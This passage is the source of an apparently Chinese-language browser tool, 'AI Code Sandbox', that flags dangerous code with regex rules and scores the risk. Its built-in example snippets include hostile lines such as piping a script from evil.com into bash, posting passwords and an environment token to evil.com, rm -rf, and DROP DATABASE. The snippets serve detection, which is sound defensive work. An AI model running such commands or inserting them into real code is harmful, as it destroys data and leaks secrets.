+    id:'sudo', regex:/\bsudo\s+/i,
+    message:'使用 sudo 执行命令 - 超级用户权限', category:'PERMISSION',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'input-os-system', regex:/\bos\.system\s*\(/i,
+    message:'os.system 系统命令执行', category:'CODE_EXEC',
+    severity:'HIGH', languages:'python',
+  },
+  {
+    id:'input-popen', regex:/\bos\.popen\s*\(/i,
+    message:'os.popen 命令执行', category:'CODE_EXEC',
+    severity:'HIGH', languages:'python',
+  },
+
+  // ---- DATA MUTATION ----
+  {
+    id:'sql-delete', regex:/\bDELETE\s+FROM\b/i,
+    message:'SQL DELETE 语句 - 可能有数据丢失风险', category:'DATA_MUTATION',
+    severity:'HIGH', languages:'sql',
+  },
+  {
+    id:'sql-update-no-where', regex:/\bUPDATE\s+\S+\s+SET\b(?![\s\S]*?\bWHERE\b)/i,
+    message:'UPDATE 语句缺少 WHERE 子句 - 可能更新全表', category:'DATA_MUTATION',
+    severity:'CRITICAL', languages:'sql',
+  },
+  {
+    id:'sql-delete-no-where', regex:/\bDELETE\s+FROM\s+\S+[\s\S]*?(?<!WHERE\s)/i,
+    message:'DELETE 语句缺少 WHERE 子句 - 可能删除全表', category:'DATA_MUTATION',
+    severity:'CRITICAL', languages:'sql',
+  },
+  {
+    id:'sql-alter', regex:/\bALTER\s+(TABLE|DATABASE)\b/i,
+    message:'SQL ALTER 结构变更', category:'DATA_MUTATION',
+    severity:'MEDIUM', languages:'sql',
+  },
+  {
+    id:'dd-command', regex:/\bdd\s+if=/i,
+    message:'dd 磁盘操作命令', category:'DATA_MUTATION',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'redirect-dev-null', regex:/>\s*\/dev\/null\b/i,
+    message:'输出重定向到 /dev/null - 丢弃数据', category:'DATA_MUTATION',
+    severity:'LOW', languages:'bash',
+  },
+
+  // ---- SENSITIVE API / ENV ----
+  {
+    id:'env-access', regex:/\bprocess\.env\b|\bos\.environ\b|\bprocess\.env\.\w+/i,
+    message:'访问环境变量 - 可能泄露密钥', category:'SENSITIVE_API',
+    severity:'MEDIUM', languages:'javascript,python',
+  },
+  {
+    id:'password-hardcode', regex:/password\s*[:=]\s*['"][^'"]+['"]|\bpasswd\s*[:=]\s*['"][^'"]+['"]|\bsecret\s*[:=]\s*['"][^'"]+['"]|\bapi[_-]?key\s*[:=]\s*['"][^'"]{8,}['"]/i,
+    message:'检测到硬编码的密码/密钥', category:'SENSITIVE_API',
+    severity:'CRITICAL', languages:'any',
+  },
+  {
+    id:'localStorage-access', regex:/\blocalStorage\.(setItem|getItem|removeItem|clear)\s*\(/i,
+    message:'浏览器本地存储操作', category:'SENSITIVE_API',
+    severity:'LOW', languages:'javascript',
+  },
+  {
+    id:'document-cookie', regex:/\bdocument\.cookie\b/i,
+    message:'直接操作 Cookie - 安全敏感操作', category:'SENSITIVE_API',
+    severity:'MEDIUM', languages:'javascript',
+  },
+  {
+    id:'crypto-wallet', regex:/\b(private[_-]?key|mnemonic|seed[_-]?phrase|wallet[_-]?import)\b/i,
+    message:'可能的加密钱包密钥操作', category:'SENSITIVE_API',
+    severity:'CRITICAL', languages:'any',
+  },
+  {
+    id:'open-file', regex:/open\s*\([^)]*['"]w['"][^)]*\)/,
+    message:'以写入模式打开文件', category:'DATA_MUTATION',
+    severity:'LOW', languages:'python',
+  },
+  {
+    id:'shutdown-reboot', regex:/\b(shutdown|reboot|halt|poweroff|init\s+[06])\b/i,
+    message:'系统关机/重启命令', category:'PROCESS_KILL',
+    severity:'CRITICAL', languages:'bash',
+  },
+];
+
+// ===== Example Code =====
+const EXAMPLES = [
+  {
+    name:'🗑️ 删库跑路 - Bash',
+    desc:'经典的 rm -rf 删除所有文件，curl管道执行远程脚本',
+    lang:'bash',
+    risk:'danger',
+    code:`#!/bin/bash
+# 删除项目根目录
+rm -rf /var/www/project/*
+# 下载并执行远程脚本 (供应链攻击)
+curl -s https://evil.com/backdoor.sh | bash
+# 杀掉所有服务
+killall -9 node
+# 递归修改权限
+chmod -R 777 /var/www
+# 清空日志
+echo "" > /var/log/app.log
+rm -rf /tmp/cache/*`,
+  },
+  {
+    name:'🐍 危险 Python 脚本',
+    desc:'包含 eval、文件删除、子进程调用等危险操作',
+    lang:'python',
+    risk:'danger',
+    code:`import os, subprocess, shutil
+
+user_input = input("Enter command: ")
+eval(user_input)  # 危险！执行任意代码
+
+os.system("rm -rf /tmp/test")  # 危险命令
+shutil.rmtree("./data")  # 递归删除
+
+subprocess.call("cat /etc/passwd", shell=True)  # shell注入
+
+import requests
+resp = requests.post("https://evil.com/steal", json={"passwords": "..."})
+
+os.kill(os.getpid(), 9)  # 自杀进程
+exec("import malicious_code")  # 动态执行`,
+  },
+  {
+    name:'⚡ Node.js 危险操作',
+    desc:'包含 eval、child_process、文件操作等',
+    lang:'javascript',
+    risk:'danger',
+    code:`const { exec } = require('child_process');
+const fs = require('fs');
+
+// 动态执行任意代码
+eval("console.log('dangerous')");
+
+// 命令注入风险
+exec(\`rm -rf \${userInput}\`);
+
+// 命令注入
+exec("curl http://evil.com | bash");
+
+// 删除文件
+fs.rmSync('./data', { recursive: true, force: true });
+fs.unlinkSync('./config.json');
+
+// 环境变量泄露
+const token = process.env.SECRET_TOKEN;
+fetch('https://evil.com/steal?token=' + token);
+
+// 修改权限
+fs.chmodSync('./app', 0o777);`,
+  },
+  {
+    name:'💣 SQL 数据破坏',
+    desc:'包含 DROP、DELETE、TRUNCATE 等危险 SQL 操作',
+    lang:'sql',
+    risk:'danger',
+    code:`-- 删除整个数据库
+DROP DATABASE production_db;
+
+-- 删除用户表
+DROP TABLE IF EXISTS users;
+
+-- 清空所有订单
+TRUNCATE TABLE orders;
+
+-- 删除所有用户数据 (无 WHERE!)
+DELETE FROM user_profiles;
+
+-- 更新所有用户密码
+UPDATE users SET password = 'hacked';
+
+-- 动态执行
+EXEC('DROP TABLE ' + @table_name);
+
+-- 删除索引
+DROP INDEX idx_users_email ON users;
+
+-- 结构变更
+ALTER TABLE payments DROP COLUMN amount;`,
+  },
+  {
+    name:'✅ 安全代码示例',
+    desc:'展示如何安全地实现类似功能',
+    lang:'javascript',
+    risk:'warning',
+    code:`// ✅ 安全做法：参数化命令 + 权限校验
+const { spawn } = require('child_process');
+const path = require('path');
+
+async function safeFileCleanup(dir) {
+  // 1. 路径验证 - 限制在允许的目录
+  const allowedBase = '/var/app/data';
+  const resolved = path.resolve(allowedBase, dir);
+  if (!resolved.startsWith(allowedBase)) {
+    throw new Error('Invalid path');
+  }
+
+  // 2. 使用 spawn 代替 exec，参数独立传递
+  const ls = spawn('ls', [resolved]);
+  
+  // 3. 记录所有操作日志
+  console.log('[AUDIT] File cleanup requested for:', resolved);
+  
+  return true;
+}
+
+// ✅ 安全的文件删除 - 先移到回收站而非直接删除
+async function safeDelete(filePath) {
+  const trash = path.join('/tmp/trash', Date.now().toString());
+  await fs.promises.rename(filePath, trash);
+}`,
+  },
+];
+
+// ============================================================
+//  STATE
+// ============================================================
+let currentFindings = [];
+let currentScore = 0;
+let activeTab = 'report';
+
+// ============================================================
+//  INIT
+// ============================================================
+const editor = document.getElementById('codeEditor');
+const lineNumbers = document.getElementById('lineNumbers');
+const codeHighlight = document.getElementById('codeHighlight');
+const charCount = document.getElementById('charCount');
+
+function updateLineNumbers() {
+  const lines = editor.value.split('\n');
+  const count = Math.max(lines.length, 1);
+  const currentLn = lineNumbers.children.length;
+  
+  if (count > currentLn) {
+    for (let i = currentLn + 1; i <= count; i++) {
+      const span = document.createElement('span');
+      span.className = 'ln safe-line';
+      span.textContent = i;
+      lineNumbers.appendChild(span);
+    }
+  } else if (count < currentLn) {
+    while (lineNumbers.children.length > count) {
+      lineNumbers.removeChild(lineNumbers.lastChild);
+    }
+  }
+  
+  // Reset all line number classes
+  Array.from(lineNumbers.children).forEach(ln => {
+    ln.className = 'ln safe-line';
+  });
+  
+  charCount.textContent = `${editor.value.length} 字符`;
+}
+
+function updateHighlight() {
+  // Reset
+  codeHighlight.innerHTML = '';
+  const text = editor.value;
+  if (!text) return;
+  
+  // Apply highlighting based on current findings
+  if (currentFindings.length === 0) {
+    codeHighlight.textContent = text;
+    return;
+  }
+  
+  // Build highlighted version
+  const lines = text.split('\n');
+  const dangerousLines = new Map(); // lineNum -> {severity, finding}
+  
+  currentFindings.forEach(f => {
+    const existing = dangerousLines.get(f.line);
+    if (!existing || (SEVERITY[f.severity]?.score || 0) > (SEVERITY[existing.severity]?.score || 0)) {
+      dangerousLines.set(f.line, f);
+    }
+  });
+  
+  let result = '';
+  lines.forEach((line, idx) => {
+    const lineNum = idx + 1;
+    const finding = dangerousLines.get(lineNum);
+    
+    if (finding) {
+      const cls = finding.severity === 'CRITICAL' || finding.severity === 'HIGH' ? 'danger-span' : 'warning-span';
+      result += `<span class="${cls}">${escapeHtml(line)}</span>\n`;
+    } else {
+      result += escapeHtml(line) + '\n';
+    }
+  });
+  
+  codeHighlight.innerHTML = result;
+}
+
+function highlightLineNumbers() {
+  const dangerousLines = new Set();
+  currentFindings.forEach(f => dangerousLines.add(f.line));
+  
+  Array.from(lineNumbers.children).forEach((ln, idx) => {
+    const lineNum = idx + 1;
+    // Find highest severity for this line
+    const lineFindings = currentFindings.filter(f => f.line === lineNum);
+    const hasCritical = lineFindings.some(f => f.severity === 'CRITICAL' || f.severity === 'HIGH');
+    
+    if (hasCritical) {
+      ln.className = 'ln danger-line';
+    } else if (lineFindings.length > 0) {
+      ln.className = 'ln warning-line';
+    } else {
+      ln.className = 'ln safe-line';
+    }
+  });
+}
+
+function escapeHtml(str) {
+  const map = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
+  return str.replace(/[&<>"']/g, c => map[c]);
+}
+
+// ============================================================
+//  DETECTION LOGIC
+// ============================================================
+function detectLanguage(code) {
+  const manualLang = document.getElementById('langSelect').value;
+  if (manualLang !== 'auto') return manualLang;
+  
+  // Auto-detect
+  const python = (code.match(/def\s+\w+\s*\(|import\s+\w+|from\s+\w+\s+import|print\s*\(|elif\b|class\s+\w+.*:/g) || []).length;
+  const javascript = (code.match(/const\s+|let\s+|var\s+|function\s+\w+\s*\(|=>|require\s*\(|console\.log|export\s+/g) || []).length;
+  const bash = (code.match(/^#!\/bin\/|^\s*echo\s+|^\s*if\s+\[\[|^\s*export\s+\w+=|^\s*source\s+|\$\{?\w+\}?/gm) || []).length;
+  const sql = (code.match(/\bSELECT\s+|INSERT\s+INTO|UPDATE\s+\w+\s+SET|DELETE\s+FROM|CREATE\s+TABLE|ALTER\s+TABLE|DROP\s+TABLE/g) || []).length;
+  
+  const max = Math.max(python, javascript, bash, sql, 0);
+  if (max === 0) return 'javascript';
+  if (max === python) return 'python';
+  if (max === javascript) return 'javascript';
+  if (max === bash) return 'bash';
+  if (max === sql) return 'sql';
+  return 'javascript';
+}
+
+function runScan() {
+  const code = editor.value;
+  if (!code.trim()) {
+    showToast('请先粘贴需要检测的代码', 'error');
+    return;
+  }
+  
+  const lang = detectLanguage(code);
+  document.getElementById('langSelect').value = lang;
+  
+  // Update UI
+  const statusDot = document.getElementById('statusDot');
+  const reportStatus = document.getElementById('reportStatus');
+  statusDot.className = 'dot scanning';
+  reportStatus.textContent = '扫描中...';
+  document.getElementById('scanBtnText').textContent = '扫描中...';
+  document.getElementById('scanBtn').disabled = true;
+  
+  // Perform detection
+  setTimeout(() => {
+    currentFindings = performDetection(code, lang);
+    currentScore = calculateScore(currentFindings);
+    renderReport(currentFindings, currentScore, lang);
+    updateHighlight();
+    highlightLineNumbers();
+    saveToHistory(code, lang, currentScore, currentFindings);
+    renderHistory();
+    
+    // Update status
+    const hasIssues = currentFindings.length > 0;
+    statusDot.className = hasIssues ? 'dot danger' : 'dot safe';
+    reportStatus.textContent = hasIssues ? `发现 ${currentFindings.length} 个风险` : '未发现风险 ✓';
+    document.getElementById('scanBtnText').textContent = '安全扫描';
+    document.getElementById('scanBtn').disabled = false;
+    document.getElementById('lastScanTime').textContent = `最后扫描: ${new Date().toLocaleTimeString('zh-CN')}`;
+    
+    switchTab('report');
+  }, 300);
+}
+
+function performDetection(code, lang) {
+  const lines = code.split('\n');
+  const findings = [];
+  const matchedPatterns = new Set();
+  
+  lines.forEach((line, idx) => {
+    const lineNum = idx + 1;
+    
+    RULES.forEach(rule => {
+      // Language filter
+      const langs = (rule.languages || '').replace(/\s+/g,'').split(',').map(l => l.toLowerCase());
+      if (!langs.includes('any') && !langs.includes(lang.toLowerCase())) return;
+      
+      // Skip if we already matched this pattern on this line to avoid duplicates
+      const key = `${rule.id}:${lineNum}`;
+      if (matchedPatterns.has(key)) return;
+      
+      // Test match on the whole line
+      let match;
+      if (rule.regex instanceof RegExp) {
+        // Reset lastIndex for global flag
+        rule.regex.lastIndex = 0;
+        match = rule.regex.test(line);
+      }
+      
+      if (match) {
+        matchedPatterns.add(key);
+        findings.push({
+          id: rule.id,
+          category: rule.category,
+          severity: rule.severity,
+          message: rule.message,
+          line: lineNum,
+          code: line.length > 80 ? line.substring(0, 77) + '...' : line,
+          fullCode: line,
+        });
+      }
+    });
+  });
+  
+  // Special check: SQL DELETE/UPDATE without WHERE
+  if (lang === 'sql') {
+    const fullCode = code.toUpperCase();
+    lines.forEach((line, idx) => {
+      const lineNum = idx + 1;
+      const upper = line.toUpperCase().trim();
+      
+      if (/^DELETE\s+FROM\s+\S/i.test(upper)) {
+        // Check if there's a WHERE clause in the whole statement
+        const remaining = lines.slice(idx).join(' ').toUpperCase();
+        const nextSemicolon = remaining.indexOf(';');
+        const stmt = nextSemicolon > 0 ? remaining.substring(0, nextSemicolon) : remaining;
+        if (!stmt.includes('WHERE')) {
+          findings.push({
+            id: 'delete-no-where',
+            category: 'DATA_MUTATION',
+            severity: 'CRITICAL',
+            message: 'DELETE 语句缺少 WHERE 子句 - 可能删除全表数据！',
+            line: lineNum,
+            code: line.length > 80 ? line.substring(0, 77) + '...' : line,
+            fullCode: line,
+          });
+        }
+      }
+      
+      if (/^UPDATE\s+\S+\s+SET\b/i.test(upper)) {
+        const remaining = lines.slice(idx).join(' ').toUpperCase();
+        const nextSemicolon = remaining.indexOf(';');
+        const stmt = nextSemicolon > 0 ? remaining.substring(0, nextSemicolon) : remaining;
+        if (!stmt.includes('WHERE')) {
+          findings.push({
+            id: 'update-no-where',
+            category: 'DATA_MUTATION',
+            severity: 'CRITICAL',
+            message: 'UPDATE 语句缺少 WHERE 子句 - 可能更新全表数据！',
+            line: lineNum,
+            code: line.length > 80 ? line.substring(0, 77) + '...' : line,
+            fullCode: line,
+          });
+        }
+      }
+    });
+  }
+  
+  return findings;
+}
+
+function calculateScore(findings) {
+  if (findings.length === 0) return 0;
+  
+  let score = 0;
+  findings.forEach(f => {
+    score += (SEVERITY[f.severity] || SEVERITY.LOW).score;
+  });
+  
+  // Cap at 100
+  return Math.min(score, 100);
+}
+
+// ============================================================
+//  RENDER REPORT
+// ============================================================
+function renderReport(findings, score, lang) {
+  const scoreSection = document.getElementById('scoreSection');
+  const findingsContainer = document.getElementById('findings');
+  const summary = document.getElementById('summary');
+  const emptyState = document.getElementById('emptyState');
+  const reportBadge = document.getElementById('reportBadge');
+  
+  // Counts
+  const counts = {CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0};
+  findings.forEach(f => { counts[f.severity] = (counts[f.severity] || 0) + 1; });
+  
+  document.getElementById('criticalCount').textContent = counts.CRITICAL;
+  document.getElementById('highCount').textContent = counts.HIGH;
+  document.getElementById('mediumCount').textContent = counts.MEDIUM;
+  document.getElementById('lowCount').textContent = counts.LOW;
+  
+  // Gauge
+  const circumference = 326.73;
+  const offset = circumference - (score / 100) * circumference;
+  const gaugeFill = document.getElementById('gaugeFill');
+  gaugeFill.setAttribute('stroke-dashoffset', offset);
+  
+  let gaugeColor;
+  if (score >= 80) gaugeColor = 'var(--critical)';
+  else if (score >= 50) gaugeColor = 'var(--orange)';
+  else if (score >= 25) gaugeColor = 'var(--yellow)';
+  else if (score > 0) gaugeColor = 'var(--blue)';
+  else gaugeColor = 'var(--green)';
+  gaugeFill.setAttribute('stroke', gaugeColor);
+  
+  document.getElementById('gaugeValue').textContent = score;
+  document.getElementById('gaugeValue').style.color = gaugeColor;
+  
+  // Show/Hide
+  scoreSection.style.display = findings.length > 0 ? 'block' : 'none';
+  
+  // Findings list
+  findingsContainer.innerHTML = '';
+  
+  if (findings.length === 0) {
+    findingsContainer.innerHTML = `
+      <div class="empty-state">
+        <div class="icon">✅</div>
+        <div class="msg">
+          代码安全扫描通过！<br>未检测到危险操作
+        </div>
+      </div>`;
+  } else {
+    // Sort by severity
+    const sorted = [...findings].sort((a,b) => {
+      const order = {CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3};
+      return (order[a.severity] || 99) - (order[b.severity] || 99);
+    });
+    
+    sorted.forEach(f => {
+      const sev = SEVERITY[f.severity] || SEVERITY.MEDIUM;
+      const cat = CATEGORIES[f.category] || {name:f.category, icon:'🔍'};
+      const el = document.createElement('div');
+      el.className = `finding ${sev.label}`;
+      el.innerHTML = `
+        <div class="finding-header">
+          <span class="finding-severity ${sev.label}">${sev.label}</span>
+          <span class="finding-line">行 ${f.line}</span>
+          <span style="font-size:10px;color:var(--fg3);margin-left:auto">${cat.icon} ${cat.name}</span>
+        </div>
+        <div class="finding-message">${sev.icon} ${f.message}</div>
+        <div class="finding-code">${escapeHtml(f.code)}</div>
+      `;
+      el.onclick = () => scrollToLine(f.line);
+      findingsContainer.appendChild(el);
+    });
+  }
+  
+  // Summary
+  if (findings.length > 0) {
+    summary.className = 'summary visible';
+    
+    let riskLevel, riskColor, riskEmoji;
+    if (score >= 80) { riskLevel = '极高风险'; riskColor = 'var(--critical)'; riskEmoji = '🚨'; }
+    else if (score >= 50) { riskLevel = '高风险'; riskColor = 'var(--high)'; riskEmoji = '🔥'; }
+    else if (score >= 25) { riskLevel = '中风险'; riskColor = 'var(--medium)'; riskEmoji = '⚠️'; }
+    else { riskLevel = '低风险'; riskColor = 'var(--low)'; riskEmoji = 'ℹ️'; }
+    
+    summary.innerHTML = `
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width:${score}%;background:${riskColor}"></div>
+      </div>
+      <div class="summary-text">
+        <span class="emoji">${riskEmoji}</span> 
+        <strong style="color:${riskColor}">${riskLevel}</strong> — 
+        共检测到 <strong>${findings.length}</strong> 个风险点，
+        严重 ${counts.CRITICAL} 个，高风险 ${counts.HIGH} 个，中风险 ${counts.MEDIUM} 个，低风险 ${counts.LOW} 个。<br>
+        <span style="font-size:10px;color:var(--fg3);margin-top:4px;display:inline-block">
+          语言: ${lang.toUpperCase()} | 检测引擎 v2.0
+        </span>
+      </div>
+    `;
+  } else {
+    summary.className = 'summary';
+  }
+  
+  reportBadge.style.display = findings.length > 0 ? 'inline' : 'none';
+  reportBadge.textContent = findings.length;
+}
+
+function scrollToLine(lineNum) {
+  const lines = editor.value.substring(0, 
+    editor.value.split('\n').slice(0, lineNum - 1).join('\n').length + (lineNum > 1 ? 1 : 0)
+  ).length;
+  
+  // Scroll the textarea
+  const lineHeight = 21.45; // 13px * 1.65
+  const scrollTop = Math.max(0, (lineNum - 5) * lineHeight);
+  editor.scrollTop = scrollTop;
+  
+  // Highlight the line temporarily
+  editor.focus();
+  editor.setSelectionRange(lines, lines);
+}
+
+// ============================================================
+//  HISTORY
+// ============================================================
+function getHistory() {
+  try {
+    return JSON.parse(localStorage.getItem('ai-code-sandbox-history') || '[]');
+  } catch(e) {
+    return [];
+  }
+}
+
+function saveToHistory(code, lang, score, findings) {
+  const history = getHistory();
+  history.unshift({
+    timestamp: Date.now(),
+    code: code.substring(0, 500),
+    fullCodeLength: code.length,
+    lang,
+    score,
+    findingsCount: findings.length,
+    criticalCount: findings.filter(f => f.severity === 'CRITICAL').length,
+    highCount: findings.filter(f => f.severity === 'HIGH').length,
+  });
+  
+  // Keep last 50
+  const trimmed = history.slice(0, 50);
+  localStorage.setItem('ai-code-sandbox-history', JSON.stringify(trimmed));
+  
+  document.getElementById('historyBadge').textContent = trimmed.length;
+}
+
+function renderHistory() {
+  const history = getHistory();
+  const container = document.getElementById('tab-history');
+  const badge = document.getElementById('historyBadge');
+  
+  badge.textContent = history.length;
+  
+  if (history.length === 0) {
+    container.innerHTML = `
+      <div class="empty-state">
+        <div class="icon">📜</div>
+        <div class="msg">尚无扫描历史<br>扫描代码后历史记录将在此显示</div>
+      </div>`;
+    return;
+  }
+  
+  container.innerHTML = history.map((h, i) => {
+    const time = new Date(h.timestamp);
+    const timeStr = time.toLocaleString('zh-CN', {month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit'});
+    const scoreClass = h.score >= 50 ? 'danger' : h.score > 0 ? 'warning' : 'safe';
+    
+    return `
+      <div class="history-item" onclick="loadHistoryItem(${i})">
+        <div class="history-time">${timeStr}</div>
+        <div class="history-summary">
+          <span style="font-size:11px;color:var(--fg2)">扫描完成</span>
+          <span class="history-score ${scoreClass}">${h.score}分</span>
+          <span class="history-lang">${h.lang}</span>
+        </div>
+        <div style="font-size:10px;color:var(--fg3);margin-top:4px">
+          代码 ${h.fullCodeLength} 字符 · 
+          ${h.findingsCount} 个风险 · 
+          严重 ${h.criticalCount} · 
+          高风险 ${h.highCount}
+        </div>
+        <div class="history-actions">
+          <button class="btn btn-ghost btn-sm" onclick="event.stopPropagation();loadHistoryCode(${i})">📋 加载代码</button>
+          <button class="btn btn-ghost btn-sm" onclick="event.stopPropagation();deleteHistoryItem(${i})">🗑️</button>
+        </div>
+      </div>`;
+  }).join('');
+  
+  // Clear history button
+  container.innerHTML += `
+    <div style="padding:12px;text-align:center">
+      <button class="btn btn-ghost btn-sm" onclick="clearAllHistory()" style="color:var(--red)">
+        🗑️ 清空全部历史
+      </button>
+    </div>`;
+}
+
+function loadHistoryItem(index) {
+  // Just show the item - clicking loads code below
+  loadHistoryCode(index);
+}
+
+function loadHistoryCode(index) {
+  const history = getHistory();
+  if (index < 0 || index >= history.length) return;
+  
+  const item = history[index];
+  editor.value = item.code;
+  updateLineNumbers();
+  updateHighlight();
+  
+  // Set language
+  document.getElementById('langSelect').value = item.lang;
+  
+  showToast('已加载历史代码', 'success');
+  switchTab('report');
+}
+
+function deleteHistoryItem(index) {
+  const history = getHistory();
+  history.splice(index, 1);
+  localStorage.setItem('ai-code-sandbox-history', JSON.stringify(history));
+  renderHistory();
+  showToast('已删除', 'success');
+}
+
+function clearAllHistory() {
+  if (confirm('确定要清空所有扫描历史吗？此操作不可撤销。')) {
+    localStorage.removeItem('ai-code-sandbox-history');
+    renderHistory();
+    showToast('历史记录已清空', 'success');
+  }
+}
+
+// ============================================================
+//  EXAMPLES
+// ============================================================
+function openExamples() {
+  const list = document.getElementById('exampleList');
+  list.innerHTML = EXAMPLES.map((ex, i) => `
+    <div class="example-item" onclick="loadExample(${i})">
+      <div class="example-info">
+        <div class="example-name">${ex.name}</div>
+        <div class="example-desc">${ex.desc}</div>
+        <div class="example-preview">${escapeHtml(ex.code.substring(0, 80))}...</div>
+      </div>
+      <span class="example-badge ${ex.risk}">${ex.risk === 'danger' ? '危险' : '安全'}</span>
+    </div>
+  `).join('');
+  
+  document.getElementById('examplesModal').classList.add('active');
+}
+
+function closeExamples() {
+  document.getElementById('examplesModal').classList.remove('active');
+}
+
+function loadExample(index) {
+  const ex = EXAMPLES[index];
+  editor.value = ex.code;
+  updateLineNumbers();
+  updateHighlight();
+  document.getElementById('langSelect').value = ex.lang;
+  closeExamples();
+  showToast(`已加载示例: ${ex.name}`, 'success');
+  
+  // Auto-scan after a short delay
+  setTimeout(runScan, 400);
+}
+
+// Close modal on overlay click
+document.getElementById('examplesModal').addEventListener('click', function(e) {
+  if (e.target === this) closeExamples();
+});
+
+// Close modal on Escape
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') closeExamples();
+});
+
+// ============================================================
+//  TAB SWITCHING
+// ============================================================
+function switchTab(tab) {
+  activeTab = tab;
+  
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelector(`[data-tab="${tab}"]`)?.classList.add('active');
+  
+  document.getElementById('tab-report').style.display = tab === 'report' ? 'block' : 'none';
+  document.getElementById('tab-history').style.display = tab === 'history' ? 'block' : 'none';
+  
+  if (tab === 'history') {
+    document.getElementById('tab-history').classList.add('visible');
+    renderHistory();
+  } else {
+    document.getElementById('tab-history').classList.remove('visible');
+  }
+}
+
+// ============================================================
+//  EDITOR EVENTS
+// ============================================================
+editor.addEventListener('input', () => {
+  updateLineNumbers();
+  updateHighlight();
+  charCount.textContent = `${editor.value.length} 字符`;
+});
+
+editor.addEventListener('scroll', () => {
+  lineNumbers.scrollTop = editor.scrollTop;
+  codeHighlight.scrollTop = editor.scrollTop;
+});
+
+// Ctrl+Enter to scan
+editor.addEventListener('keydown', (e) => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+    e.preventDefault();
+    runScan();
+  }
+});
+
+// Tab key support
+editor.addEventListener('keydown', (e) => {
+  if (e.key === 'Tab') {
+    e.preventDefault();
+    const start = editor.selectionStart;
+    const end = editor.selectionEnd;
+    editor.value = editor.value.substring(0, start) + '  ' + editor.value.substring(end);
+    editor.selectionStart = editor.selectionEnd = start + 2;
+    updateLineNumbers();
+    updateHighlight();
+  }
+});
+
+function clearEditor() {
+  if (editor.value.trim() && !confirm('确定要清空编辑器内容吗？')) return;
+  editor.value = '';
+  currentFindings = [];
+  currentScore = 0;
+  updateLineNumbers();
+  updateHighlight();
+  renderReport([], 0, '');
+  
+  const statusDot = document.getElementById('statusDot');
+  statusDot.className = 'dot idle';
+  document.getElementById('reportStatus').textContent = '等待扫描';
+  document.getElementById('scoreSection').style.display = 'none';
+  document.getElementById('summary').className = 'summary';
+  document.getElementById('reportBadge').style.display = 'none';
+}
+
+// ============================================================
+//  TOAST
+// ============================================================
+let toastTimer;
+function showToast(msg, type) {
+  const toast = document.getElementById('toast');
+  toast.textContent = msg;
+  toast.className = `toast ${type} show`;
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => {
+    toast.classList.remove('show');
+  }, 2500);
+}
+
+// ============================================================
+//  INIT
+// ============================================================
+updateLineNumbers();
+renderHistory();
+
+// ============================================================
+//  KEYBOARD SHORTCUTS
+// ============================================================
+document.addEventListener('keydown', (e) => {
+  // Ctrl+E -> open examples
+  if ((e.ctrlKey || e.metaKey) && e.key === 'e' && !e.target.closest('textarea')) {
+    e.preventDefault();
+    openExamples();
+  }
+  // Ctrl+H -> toggle history
+  if ((e.ctrlKey || e.metaKey) && e.key === 'h' && !e.target.closest('textarea')) {
+    e.preventDefault();
+    switchTab(activeTab === 'history' ? 'report' : 'history');
+  }
+});
+
+console.log('🛡️ AI Code Sandbox v2.0 — 代码安全沙盒已就绪');
+console.log('   支持语言: JavaScript / Python / Bash / SQL');
+console.log('   检测范围: 文件删除 / 网络请求 / 进程管理 / 权限变更 / 代码执行 / 数据破坏 / 敏感API');
+console.log('   快捷键: Ctrl+Enter 扫描 | Ctrl+E 示例 | Ctrl+H 切换历史');
+</script>
+</body>
+</html>
